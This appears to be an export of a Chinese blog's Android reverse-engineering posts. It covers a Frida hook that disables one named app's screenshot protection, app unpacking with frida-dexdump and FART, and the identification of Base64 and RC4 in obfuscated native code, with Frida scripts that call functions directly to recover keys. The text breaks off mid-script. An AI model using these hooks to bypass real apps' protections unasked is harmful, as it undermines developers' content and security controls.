<img src="/2024/07/29/%E5%A6%B9%E5%AD%90%E5%9B%BE%E9%98%B2%E6%88%AA%E5%B1%8F%E7%A0%B4%E8%A7%A3/image-20240727214328019.png" class="" title="image-20240727214328019">

<p><code>frida -U -f com.mmzztt.app -l r0tracer.js -o log.txt</code></p>
<img src="/2024/07/29/%E5%A6%B9%E5%AD%90%E5%9B%BE%E9%98%B2%E6%88%AA%E5%B1%8F%E7%A0%B4%E8%A7%A3/image-20240727222318578.png" class="" title="image-20240727222318578">

<p>写frida脚本重写<code>setFlags</code>方法</p>
<pre><code class="js">setImmediate(function(){
    Java.perform(function(){
        Java.use("android.view.Window").setFlags.implementation = function(x){
            console.log("setFlags called")
        }
    })
})
</code></pre>
<img src="/2024/07/29/%E5%A6%B9%E5%AD%90%E5%9B%BE%E9%98%B2%E6%88%AA%E5%B1%8F%E7%A0%B4%E8%A7%A3/image-20240727222415292.png" class="" title="image-20240727222415292">

<p>现在再尝试截屏就可以成功了</p>
<img src="/2024/07/29/%E5%A6%B9%E5%AD%90%E5%9B%BE%E9%98%B2%E6%88%AA%E5%B1%8F%E7%A0%B4%E8%A7%A3/image-20240728103834003.png" class="" title="image-20240728103834003">

<h3 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h3><img src="/2024/07/29/%E5%A6%B9%E5%AD%90%E5%9B%BE%E9%98%B2%E6%88%AA%E5%B1%8F%E7%A0%B4%E8%A7%A3/image-20240728104911709.png" class="" title="image-20240728104911709">

<p>另外这个app还加壳了，尝试使用<a href="https://github.com/hluwa/frida-dexdump">frida-dexdump</a>直接脱壳</p>
<p>使用起来还是比较简单的</p>
<img src="/2024/07/29/%E5%A6%B9%E5%AD%90%E5%9B%BE%E9%98%B2%E6%88%AA%E5%B1%8F%E7%A0%B4%E8%A7%A3/image-20240727221159301.png" class="" title="image-20240727221159301">

<p><code>frida-dexdump -FU</code></p>
<img src="/2024/07/29/%E5%A6%B9%E5%AD%90%E5%9B%BE%E9%98%B2%E6%88%AA%E5%B1%8F%E7%A0%B4%E8%A7%A3/image-20240728105255322.png" class="" title="image-20240728105255322">

<ul>
<li>略微有些错误，大部分是没有问题的</li>
</ul>
<p>尝试搜索调用栈中的方法看能不能找到</p>
<img src="/2024/07/29/%E5%A6%B9%E5%AD%90%E5%9B%BE%E9%98%B2%E6%88%AA%E5%B1%8F%E7%A0%B4%E8%A7%A3/image-20240728110508581.png" class="" title="image-20240728110508581">

<img src="/2024/07/29/%E5%A6%B9%E5%AD%90%E5%9B%BE%E9%98%B2%E6%88%AA%E5%B1%8F%E7%A0%B4%E8%A7%A3/image-20240728110706589.png" class="" title="image-20240728110706589">

<img src="/2024/07/29/%E5%A6%B9%E5%AD%90%E5%9B%BE%E9%98%B2%E6%88%AA%E5%B1%8F%E7%A0%B4%E8%A7%A3/image-20240728110803509.png" class="" title="image-20240728110803509">

<ul>
<li>都能搜索到，接下来对想要hook的目标函数，写脚本进行hook即可</li>
</ul>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>App抓包</tag>
        <tag>Frida Hook</tag>
        <tag>脱壳</tag>
      </tags>
  </entry>
  <entry>
    <title>密码学初步认识</title>
    <url>/2024/02/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/</url>
    <content><![CDATA[<p>接下来几篇文章主要是对常见加解密算法的认识和逆向分析，如果不了解加解密算法的话我们直接去分析app是比较困难的。</p>
<span id="more"></span>

<img src="/2024/02/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/image-20240213164204962.png" class="" title="image-20240213164204962">

<p>接下来几篇文章要达到的目的：</p>
<ol>
<li>掌握常见的加解密算法的基本原理</li>
<li>掌握对app逆向分析过程中快算识别，使用的标准加解密算法的方法</li>
</ol>
<p>算法简单分类</p>
<ol>
<li>对称密码<ol>
<li>序列密码（流密码）：将明文消息按字符逐位进行加密。（RC4）</li>
<li>分组密码：将明文消息分组（每组有多个字符可能非常多，可以有几M甚至几个G），逐组进行加密。（ABS、AES）</li>
</ol>
</li>
<li>非对称密码</li>
<li>散列算法（消息摘要）</li>
</ol>
<h3 id="BASE64编码简介"><a href="#BASE64编码简介" class="headerlink" title="BASE64编码简介"></a>BASE64编码简介</h3><p>像BASE16、BASE32、BASE64、BASE85、BASE36、BASE58、BASE91、BASE92、BASE62，这些都是编码方式，对应有各自的一套编码算法。类似的还有url编码。</p>
<p>有些时候也会称这些为加密，例如经常有人说BASE64加密。其实这种说法不太严谨，这些都是对信息的一种编码表示形式，并不涉及到加密密钥key。因此，只要得到了对应的编码算法，也就是拿到了对应的密钥。</p>
<p>BASE64编码是网络上最常用的用于传输字节信息的编码方式之一，BASE64就是一种基于64个可打印字符来表示二进制数据的方法。其它BASE家族的编码也是同理。</p>
<h6 id="BASE64编码原理：用64个可见字符来表示8bite位二进制（A-Z、a-z、0-9、“-”、“-x2F-”、还有“-x3D-”用于填充）。"><a href="#BASE64编码原理：用64个可见字符来表示8bite位二进制（A-Z、a-z、0-9、“-”、“-x2F-”、还有“-x3D-”用于填充）。" class="headerlink" title="BASE64编码原理：用64个可见字符来表示8bite位二进制（A-Z、a-z、0-9、“+”、“/”、还有“=”用于填充）。"></a>BASE64编码原理：用64个可见字符来表示8bite位二进制（A-Z、a-z、0-9、“+”、“/”、还有“=”用于填充）。</h6><h6 id="BASE32编码原理：用32个可见字符来表示8bite位二进制（A-Z、2-7）。"><a href="#BASE32编码原理：用32个可见字符来表示8bite位二进制（A-Z、2-7）。" class="headerlink" title="BASE32编码原理：用32个可见字符来表示8bite位二进制（A-Z、2-7）。"></a>BASE32编码原理：用32个可见字符来表示8bite位二进制（A-Z、2-7）。</h6><p>Android中的BASE64编码使用android.util包下提供的Base64类，其中提供了Base64编码和解码相关的API可以直接使用。</p>
<h3 id="BASE64在反汇编后的表现形式"><a href="#BASE64在反汇编后的表现形式" class="headerlink" title="BASE64在反汇编后的表现形式"></a>BASE64在反汇编后的表现形式</h3><p>在代码没有加混淆的时候，我们用GDA反编译看一下它的java代码</p>
<img src="/2024/02/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/image-20240213164952013.png" class="" title="image-20240213164952013">

<ul>
<li><p>此时反编译出来的都是明文，我们可以直接看到代码调用了Base64.encodeToString()</p>
</li>
<li><p>如果是自己实现的base64或者在有名称混淆的情况下，就没有这个容易分辨出来了</p>
<blockquote>
<p>遇到这种情况，可以考虑使用hook的方法去主动调用其中的方法，给它传入一个参数，然后看它的返回结果是什么</p>
</blockquote>
</li>
</ul>
<h3 id="so文件中的base64"><a href="#so文件中的base64" class="headerlink" title="so文件中的base64"></a>so文件中的base64</h3><p>将so文件提取出来放在ida中分析，可以通过字符串（CTRL+F12）中的base64编码表定位到其被调用的位置</p>
<img src="/2024/02/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/image-20240213170022186.png" class="" title="image-20240213170022186">

<img src="/2024/02/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/image-20240213170028216.png" class="" title="image-20240213170028216">

<ul>
<li>这些也是在没有加壳也没有混淆的情况下，直接就可以定位到。然后<strong>F5</strong>就可以很清晰的反编译出来</li>
</ul>
<h3 id="加了ollvm后so文件中的base64"><a href="#加了ollvm后so文件中的base64" class="headerlink" title="加了ollvm后so文件中的base64"></a>加了ollvm后so文件中的base64</h3><img src="/2024/02/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/image-20240213170213140.png" class="" title="image-20240213170213140">

<img src="/2024/02/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/image-20240213170221040.png" class="" title="image-20240213170221040">

<ul>
<li>此时虽然还是相同的代码，但是反编译结果的流程就已经完全被打乱看不出来是什么函数了。整个流程看起来非常的复杂。想要直接分析这个是非常困难的</li>
<li>对于这种情况我们可以考虑使用重放攻击，也就是我们再前面说的主动去调用这个函数，给他传入参数看它的输出结果</li>
</ul>
<h4 id="尝试分析"><a href="#尝试分析" class="headerlink" title="尝试分析"></a>尝试分析</h4><h6 id="要使用重放攻击，首先我们要搞明白目标函数是哪一个它的地址在哪，然后分析出它的传参是什么"><a href="#要使用重放攻击，首先我们要搞明白目标函数是哪一个它的地址在哪，然后分析出它的传参是什么" class="headerlink" title="要使用重放攻击，首先我们要搞明白目标函数是哪一个它的地址在哪，然后分析出它的传参是什么"></a>要使用重放攻击，首先我们要搞明白目标函数是哪一个它的地址在哪，然后分析出它的传参是什么</h6><p>首先，我们照常根据字符串中的编码表定位到调用函数，然后F5查看这个函数的交叉引用</p>
<img src="/2024/02/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/image-20240213170845146.png" class="" title="image-20240213170845146">

<ul>
<li>看到有一个交叉引用，我们跟进去看一下</li>
</ul>
<img src="/2024/02/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/image-20240213170916351.png" class="" title="image-20240213170916351">

<ul>
<li><p>进来之后发现这个函数经过ollvm后还是相对比较简单的，是一个JNI函数。这里我们可以去用GDA或者GADX反编译一下看看它的定义。根据定义看看是否需要修改一下ida的识别结果</p>
<img src="/2024/02/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/image-20240213171319042.png" class="" title="image-20240213171319042">

<ul>
<li>首先它的参数是一个str类型</li>
</ul>
</li>
<li><p>根据定义修改函数的变量</p>
<img src="/2024/02/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/image-20240213171407473.png" class="" title="image-20240213171407473">

<ul>
<li><p>第三个参数是我们输入的字符日，前面两个是隐藏参数（参数1：JNIEnv*，参数2：调用者：静态为jclass、非静态为：jobject）</p>
</li>
<li><p>sub_19D6会接收我们输入的字符串，然后返回一个值。进入查看一下这个函数</p>
<img src="/2024/02/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/image-20240213171711984.png" class="" title="image-20240213171711984">

<ul>
<li>函数的返回值类型是<strong>const char</strong>*，函数的参数类型识别错误了手动修改一下。返回值是C格式的<strong>UTF-8</strong>字符串指针</li>
</ul>
</li>
<li><p>再返回上一级分析循环代码可知在下一轮循环中就进入了<strong>sub_834</strong></p>
<img src="/2024/02/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/image-20240213172202980.png" class="" title="image-20240213172202980">

<ul>
<li>弄清楚了这个函数的大概作用和接收的参数后，可以写frida脚本来验证一下这个函数的输入和返回</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="Frida脚本"><a href="#Frida脚本" class="headerlink" title="Frida脚本"></a>Frida脚本</h3><pre><code class="js">function activeinvokesub_834(content){
    var offset = 0x834 + 1;		// 直接通过硬偏移调用，这个地址为：函数所在偏移+1
    var nativelibmodule = Process.getModuleByName("libnative-lib.so");
    var addr = nativelibmodule.base.add(offset);	// 基址加上偏移

    var arg0 = Memory.allocUtf8String(content);

    var sub_834 = new NativeFunction(addr, 'pointer', ['pointer']);
    var result = sub_834(arg0);
    console.log("result: ",hexdump(result, {length: 16, header: true, ansi: true}));
}
</code></pre>
<ul>
<li><p>打开手机端frida-server，执行frida命令附加我们的脚本执行</p>
<p><code>frida -U com.kanxue.encrypt01 -l base64.js</code></p>
<img src="/2024/02/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/image-20240213172616612.png" class="" title="image-20240213172616612">

<ul>
<li>上图可以看到我们的脚本被正确的附加且执行了</li>
</ul>
</li>
</ul>
<h3 id="针对函数进行重放攻击"><a href="#针对函数进行重放攻击" class="headerlink" title="针对函数进行重放攻击"></a>针对函数进行重放攻击</h3><ol>
<li>针对java实现的函数，可以简单编写frida脚本或xposed插件对函数进行主动调用。只需要知道类名和函数名就ok，对于加壳的app可能会出现找不到类找不到函数等问题，这些问题的根本原因还是使用的classloader不对，只有加载了这个class的classloader才可以找到这个类。</li>
<li>针对so中的函数，推荐使用frida脚本进行主动调用，较为简洁，当然使用xposed也可以。如果是导出函数就比较简单只需要在frida中遍历它的符号表就可以拿到函数地址。使用xposed也可以，使用dlopen、dlsym也可以快速的拿到函数地址。如果没有导出的话就需要去找到函数的基址和偏移</li>
</ol>
<h3 id="加壳的ollvm分析"><a href="#加壳的ollvm分析" class="headerlink" title="加壳的ollvm分析"></a>加壳的ollvm分析</h3><p>接下来是对加壳了的app的处理流程，怎么去快速的定位加解密算法相关的类，然后对类中的函数进行调用</p>
<h4 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h4><p>分析软件，对于能脱壳的就先把壳脱掉。</p>
<img src="/2024/02/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/image-20240216113916213.png" class="" title="image-20240216113916213">

<img src="/2024/02/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/image-20240216113927971.png" class="" title="image-20240216113927971">

<p>这里使用<a href="https://github.com/jas502n/FART-dump">frida_fart</a>脚本来脱壳：</p>
<blockquote>
<p>脚本使用方法在脚本中有说明，这里说一下大致使用流程</p>
<ol>
<li><p>将加壳app安装到手机上</p>
</li>
<li><p>运行脚本脱壳<code>frida -U -f com.kanxue.encrypt01 -l frida_fart_hook.js --no-pause</code>，对于没有存储权限的app把脚本中的savepath设置为app包所在的路径</p>
<img src="/2024/02/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/image-20240216093329714.png" class="" title="image-20240216093329714">
</li>
<li><p>调用**fart()**对codeitem进行一个dump<code>fart()</code></p>
<img src="/2024/02/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/image-20240216093417551.png" class="" title="image-20240216093417551"></li>
</ol>
</blockquote>
<p>当然脱壳方法非常多，把pixel刷入脱壳机的rom也可以</p>
<h3 id="分析dex"><a href="#分析dex" class="headerlink" title="分析dex"></a>分析dex</h3><p>通过文本搜索找到包含MainActivity的文件，然后用GDA反编译</p>
<img src="/2024/02/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/image-20240216110706274.png" class="" title="image-20240216110706274">

<img src="/2024/02/13/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86/image-20240216111055765.png" class="" title="image-20240216111055765">

<ul>
<li><p>反编译出来之后尝试用<strong>Java.perform()</strong> HOOK **caicaikan()**这个函数</p>
</li>
<li><p>这个函数是一个非静态函数，有一个string参数。对于一个非静态的函数我们需要一个实例才能对其进行主动调用</p>
<blockquote>
<pre><code class="js">function activeinvokejavafunc(content){
    Java.perform(function () {
        // com.kanxue.encrypt01.MainActivity
        var mainActivityClass = Java.use("com.kanxue.encrypt01.MainActivity");
        console.log("mainActivityClass: ", mainActivityClass);

        // public String caicaikan(String content)
        Java.choose("com.kanxue.encrypt01.MainActivity",{
            onMatch:function(obj){
                console.log("found obj: ", obj);
                var result = obj.caicaikan(content);
                console.log("result: ", result);
            },onComplete:function(){
                console.log("search heap complete");
            }
        })
    })
}
</code></pre>
</blockquote>
</li>
<li><p>对于这种情况可以直接调用就行</p>
</li>
</ul>
<p>如果一个app使用动态加载的方式，加载了一些插件中的classloader的时候，我们就需要使用frida中枚举的方式去遍历所有的classloader。枚举到了我们就把这个classloader设置为当前的classload，来进行主动调用。</p>
<blockquote>
<pre><code class="js">function activeinvokejavafunc(content){
    Java.perform(function () {
        Java.enumerateClassLoadersSync().forEach(function(classloader){
            console.log(classloader);
        });
        
        Java.enumerateClassLoadersSync().forEach(function(classloader){
            try {
                console.log(classloader);
                classloader.loadClass("com.kanxue.encrypt01.MainActivity");
                Java.classFactory.loader = classloader;

                // com.kanxue.encrypt01.MainActivity
                var mainActivityClass = Java.use("com.kanxue.encrypt01.MainActivity");
                console.log("mainActivityClass: ", mainActivityClass);

                // public String caicaikan(String content)
                Java.choose("com.kanxue.encrypt01.MainActivity",{
                    onMatch:function(obj){
                        console.log("found obj: ", obj);
                        var result = obj.caicaikan(content);
                        console.log("result: ", result);
                    },onComplete:function(){
                        console.log("search heap complete");
                    }
                })
            } catch (error) {
                console.log("error: ", error);
            }
        })
    })
}
</code></pre>
</blockquote>
<p>总结：针对函数进行重放攻击</p>
<ol>
<li>针对java实现的函数，可以简单编写frida脚本或者xposed插件对函数进行主动调用</li>
<li>针对so中的函数，推荐使用frida脚本进行主动调用，较为简单快捷；当然xposed也可以</li>
</ol>
]]></content>
      <categories>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>Frida Hook</tag>
        <tag>加解密算法分析</tag>
      </tags>
  </entry>
  <entry>
    <title>序列密码RC4理论篇</title>
    <url>/2024/02/21/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81RC4%E7%90%86%E8%AE%BA%E7%AF%87/</url>
    <content><![CDATA[<p>本章的主要内容为对RC4算法原理的了解和实现</p>
<p>RC4是序列密码中用的非常广泛的一个加解密算法</p>
<span id="more"></span>

<img src="/2024/02/21/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81RC4%E7%90%86%E8%AE%BA%E7%AF%87/image-20240217211716601.png" class="" title="image-20240217211716601">

<ul>
<li>因为是按位异或，所以显著特征是密文C和明文M的长度肯定是相等的。</li>
</ul>
<p>RC4（来自Rivest Cipher 4的缩写）是一种流加密算法，密钥长度可变。在给定一密钥时，会生成一固定序列的字节流，用于和明文进行异或。它加解密使用相同的密钥，因此属于对称加密算法。RC4已经成为一些常用协议和标准的一部分，如1997年的WEP和2003/2004年的WPA；和1995年的SSL，以及后来1999年的TLS。让他如此广泛分布和使用的主要因素是它不可思议的简单和速度，不管是软件还是硬件，实现起来都十分容易。</p>
<img src="/2024/02/21/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81RC4%E7%90%86%E8%AE%BA%E7%AF%87/image-20240217213132369.png" class="" title="image-20240217213132369">

<ul>
<li>RC4算法的原理很简单，主要包括初始化算法（KSA）和伪随机子密码生成算法（PRGA）两个部分。假设S-box的长度为256，密钥长度为Len。目前RC4在不知道key的情况下还是只能暴力破解，所以它的安全性还是有一定保证的。</li>
</ul>
<img src="/2024/02/21/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81RC4%E7%90%86%E8%AE%BA%E7%AF%87/image-20240217213447245.png" class="" title="image-20240217213447245">

<center>KSA</center>

<ul>
<li>初始化（KSA）算法部分参数1是一个256长度的char型数组，定义为：unsigned char sBox[256]；参数2是密钥，其内容可以随便定义，参数3是密钥的长度，为1-256；在初始化的过程中，密钥的主要功能是将<strong>S-box</strong>搅乱。</li>
</ul>
<img src="/2024/02/21/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81RC4%E7%90%86%E8%AE%BA%E7%AF%87/image-20240217220159012.png" class="" title="image-20240217220159012">

<center>PRGA</center>

<ul>
<li>伪随机子密码生成算法（PRGA）参数1是上边<strong>rc4_init</strong>函数中，被搅乱的<strong>S-box</strong>；参数2是需要加密的数据data。经过了PRGA算法，可以确保任一给定密钥key都可以得到一个确定的用于和明文异或的字节流序列进行加密。</li>
</ul>
<p>因为是对称加密，RC4的加密和解密过程是一样的</p>
<h3 id="实现RC4算法"><a href="#实现RC4算法" class="headerlink" title="实现RC4算法"></a>实现RC4算法</h3><p>手动写一遍RC4的算法，看一下它的加密和解密流程</p>
<p><a href="https://github.com/xiaoeeyu/RC4">代码地址</a></p>
<p>总结：经过了初始化算法（KSA）和伪随机子密码生成算法（PRGA）两个部分后，可以知道，任意一个给定的key（长度为1-256）都会得到一个特定的字节流序列，可以看成是对明文进行异或的子密钥序列。因此，对于长度足够长的RC4的密钥，其对抗暴力破解便已足够，因此，加密强度也已经相当强！</p>
<p>在KSA阶段，需要有长度为256的状态向量即S盒的参与，并会有两轮256大小的循环，对状态向量S盒进行扰乱</p>
<p>在PRGA阶段，会有循环次数为加密内容字节数的循环体，每一次循环中都会有状态向量即S盒的参与，并会重新扰乱S盒生成新的状态向量</p>
<p>RC4作为对称密码中的序列密码，没有特别的常量的存在，256算是多次出现的数字</p>
<h5 id="RC4加密算法在逆向分析过程中的快速识别方法："><a href="#RC4加密算法在逆向分析过程中的快速识别方法：" class="headerlink" title="RC4加密算法在逆向分析过程中的快速识别方法："></a>RC4加密算法在逆向分析过程中的快速识别方法：</h5><blockquote>
<ol>
<li>首先判断明文和密文长度是否相等，登场则代表是序列密码。（可以通过编写frida脚本或xposed插件完成对响应函数的主动调用，判断当输入明文为任意长度时的密文长度）</li>
<li>接下来判断是否是RC4。RC4算法中的初始化算法（KSA）中有两轮非常显著的长度为256的循环体，用于根据给定的key生成S盒；伪随机子密码生成算法（PRGA）会根据上一步得到的扰乱的S盒，进一步生成子密钥流，最终和给定的铭文进行逐字节的异或；</li>
</ol>
</blockquote>
<p>在本篇文章中我们了解了RC4的基本原理，以及分别用java和C实现了RC4。在下篇文章中将基于这份代码分别对java和C中的RC4算法进行分析。</p>
]]></content>
      <categories>
        <category>加密解密</category>
        <category>Android逆向</category>
      </categories>
      <tags>
        <tag>RC4</tag>
      </tags>
  </entry>
  <entry>
    <title>序列密码之RC4实践篇</title>
    <url>/2024/02/21/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%B9%8BRC4%E5%AE%9E%E8%B7%B5%E7%AF%87/</url>
    <content><![CDATA[<p>本章主要使用上一章开发的RC4代码作为例子进行分析，如何在逆向分析中识别RC4算法，以及如何通过编写frida代码来获取RC4的密钥。</p>
<span id="more"></span>

<h3 id="没有加壳和混淆"><a href="#没有加壳和混淆" class="headerlink" title="没有加壳和混淆"></a>没有加壳和混淆</h3><p>通过反编译工具能直接完美的反编译出来RC4算法的代码</p>
<img src="/2024/02/21/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%B9%8BRC4%E5%AE%9E%E8%B7%B5%E7%AF%87/image-20240218202604235.png" class="" title="image-20240218202604235">

<img src="/2024/02/21/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%B9%8BRC4%E5%AE%9E%E8%B7%B5%E7%AF%87/image-20240218202748275.png" class="" title="image-20240218202748275">

<img src="/2024/02/21/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%B9%8BRC4%E5%AE%9E%E8%B7%B5%E7%AF%87/image-20240218203416682.png" class="" title="image-20240218203416682">

<img src="/2024/02/21/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%B9%8BRC4%E5%AE%9E%E8%B7%B5%E7%AF%87/image-20240218203445645.png" class="" title="image-20240218203445645">

<img src="/2024/02/21/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%B9%8BRC4%E5%AE%9E%E8%B7%B5%E7%AF%87/image-20240218203530125.png" class="" title="image-20240218203530125">

<ul>
<li>此时不论是java还是native代码都可以直接反编译出来RC4的算法代码</li>
</ul>
<h3 id="apk加密混淆后"><a href="#apk加密混淆后" class="headerlink" title="apk加密混淆后"></a>apk加密混淆后</h3><p>使用ollvm对代码做一些简单的字符串混淆后</p>
<img src="/2024/02/21/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%B9%8BRC4%E5%AE%9E%E8%B7%B5%E7%AF%87/image-20240218204005595.png" class="" title="image-20240218204005595">

<ul>
<li><p>此时用IDA打开之后就看不到so文件中原本的字符串了</p>
</li>
<li><p>这种情况需要我们继续跟进分析一下，进入sub_89F4</p>
<img src="/2024/02/21/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%B9%8BRC4%E5%AE%9E%E8%B7%B5%E7%AF%87/image-20240219185935904.png" class="" title="image-20240219185935904">

<ul>
<li><p>进来之后可以看到这里面有两个函数，我们可以先进sub_86D8()分析一下。这里我们可以看到参数<strong>V7</strong>是256长度的数组，V4是a1的长度。</p>
<img src="/2024/02/21/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%B9%8BRC4%E5%AE%9E%E8%B7%B5%E7%AF%87/image-20240219190546168.png" class="" title="image-20240219190546168">

<ul>
<li><p>这里把参数v7改名为了<strong>arrar_256</strong>，这里我们还是可以分辨出来这里是我们源码中的<strong>s[i]和s[j]<strong>的交换。如下面这个</strong>rc4_init</strong>处源码的截图</p>
<img src="/2024/02/21/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%B9%8BRC4%E5%AE%9E%E8%B7%B5%E7%AF%87/image-20240219191132782.png" class="" title="image-20240219191132782"></li>
</ul>
</li>
</ul>
</li>
<li><p>从sub_86D8()出来再来分析另一个函数<strong>sub_88B8()</strong></p>
<img src="/2024/02/21/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%B9%8BRC4%E5%AE%9E%E8%B7%B5%E7%AF%87/image-20240219191705205.png" class="" title="image-20240219191705205">

<ul>
<li><p>这里的参数v7是一个256的数组，a2是一个字符串，v2是这个字符串的长度</p>
<img src="/2024/02/21/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%B9%8BRC4%E5%AE%9E%E8%B7%B5%E7%AF%87/image-20240219193300695.png" class="" title="image-20240219193300695">

<img src="/2024/02/21/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%B9%8BRC4%E5%AE%9E%E8%B7%B5%E7%AF%87/image-20240219193545384.png" class="" title="image-20240219193545384">

<ul>
<li>通过对比反编译代码和源码的循环次数和结构，可以看出来这里反编译的是<strong>rc4_crypt()</strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<p>分析完成之后，我们就可以编写frida或者xposed代码，去对分析出来的函数去进行主动调用</p>
<h3 id="编写frida代码对函数进行主动调用"><a href="#编写frida代码对函数进行主动调用" class="headerlink" title="编写frida代码对函数进行主动调用"></a>编写frida代码对函数进行主动调用</h3><p>通过前面的分析，这里我们基本可以通过分析结果来认定这是一个RC4算法</p>
<img src="/2024/02/21/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%B9%8BRC4%E5%AE%9E%E8%B7%B5%E7%AF%87/image-20240219200158830.png" class="" title="image-20240219200158830">

<ul>
<li>我们先对sub_89F4()进行调用，它的两个参数都是字符串地址</li>
</ul>
<pre><code class="js">function activeinvokesub_89F4(content1, content2){
    var offset = 0x89F4 + 1;
    var nativelibmodule = Process.getModuleByName("libnative-lib.so");
    var sub_89F4addr = nativelibmodule.base.add(offset);

    var arg0 = Memory.allocUtf8String(content1);
    var arg1 = Memory.allocUtf8String(content2);

    var sub_89F4 = new NativeFunction(sub_89F4addr, 'void', ['pointer', 'pointer']);
    console.log("input_arg0: ",hexdump(arg0),'\n input_agr1: ', hexdump(arg1));
    console.log('====================================');
    var result = sub_89F4(arg0, arg1);
    console.log("result_arg0: ",hexdump(arg0),'\n result_arg1: ', hexdump(arg1));
}
</code></pre>
<ul>
<li><p>这里分别在函数执行前和执行后，打印一下它的参数变化</p>
</li>
<li><p>传入参数调用函数执行<code>activeinvokesub_89F4('a','abcd')</code></p>
<p>在执行结果中，仅有函数执行后的arg1产生了变化，变化的位数跟我们传入的字节数是相同的</p>
<img src="/2024/02/21/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%B9%8BRC4%E5%AE%9E%E8%B7%B5%E7%AF%87/image-20240219222448055.png" class="" title="image-20240219222448055">

<ul>
<li><p>又经过几次测试，改变arg1传入字符串的长度发现result_agr1变化的位数跟我们传入的长度是一致的，基本可以说明它是一个序列密码</p>
</li>
<li><p>序列密码在不改变密钥的情况下，它的子密钥序列是特定的</p>
<blockquote>
<p>测试一下：我们将arg1参数改为<code>abcde</code>得到</p>
<img src="/2024/02/21/%E5%BA%8F%E5%88%97%E5%AF%86%E7%A0%81%E4%B9%8BRC4%E5%AE%9E%E8%B7%B5%E7%AF%87/image-20240220171648289.png" class="" title="image-20240220171648289">

<ul>
<li>可以看到这个结果的前四个字节是跟之前一样的</li>
</ul>
</blockquote>
</li>
</ul>
</li>
</ul>
<p>接下来我们如果想要获取这个RC4算法加密用的密钥就要去在刚刚分析的加密执行函数（sub_86D8、sub_88B8）调用前，通过hook拿到它的key</p>
<h5 id="应该怎么选取hook时机呢"><a href="#应该怎么选取hook时机呢" class="headerlink" title="应该怎么选取hook时机呢"></a>应该怎么选取hook时机呢</h5><p>首先，so文件呢都是通过<strong>System.loadLibrary</strong>方法去加载的。</p>
<p>需要在加载完so文件之后，执行JNI_Onload之前的流程中用到的一些函数进行hook</p>
<pre><code class="js">function hooklibnativelib(){
    //   sub_86D8((int)v7, (int)a1, v4);
    //   sub_88B8(v7, a2, v2);
    var nativelibmodule = Process.getModuleByName("libnative-lib.so");
    var sub_86D8addr = nativelibmodule.base.add(0x86D8 + 1);
    var sub_88B8addr = nativelibmodule.base.add(0x88B8 + 1);

    Interceptor.attach(sub_86D8addr, {
        onEnter: function(args){
            console.log("RC4_init onEnter");
